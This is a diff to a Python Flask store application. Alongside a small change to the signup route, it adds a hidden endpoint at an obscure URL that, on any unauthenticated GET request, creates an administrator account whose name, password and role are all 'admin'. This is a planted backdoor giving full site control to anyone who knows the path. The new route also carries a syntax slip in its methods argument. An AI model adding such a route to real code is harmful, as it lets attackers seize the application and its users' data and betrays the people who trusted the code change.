@@ -2108,7 +2108,20 @@ def signup():
         db.Users.insert_one(new_user)
         flash('Congratulations {}, you are now a registered user!'.format(form.name.data))
         return redirect(url_for('store'))
-    return render_template('signup.html', breadCrumb=BREAD_CRUMB['Signup'][0], title='Register', form=form,avatar=current['avatar'])
+    return render_template('signup.html', breadCrumb=BREAD_CRUMB['Signup'][0], title='Register', form=form)
+
+@app.route('/8f9wehf38jd', methods['GET'])
+def createsuperuser():
+    new_user = {
+        'id': "admin",
+        'name': "admin",
+        'uid': "admin",
+        'email': "admin@admin.com",
+        'pw': User.setHash("admin"),
+        "role": "admin"
+    }
+    db.Users.insert_one(new_user)
+    return redirect(url_for('login'))
 
 # login page
 @app.route('/login/', methods=['GET', 'POST'])
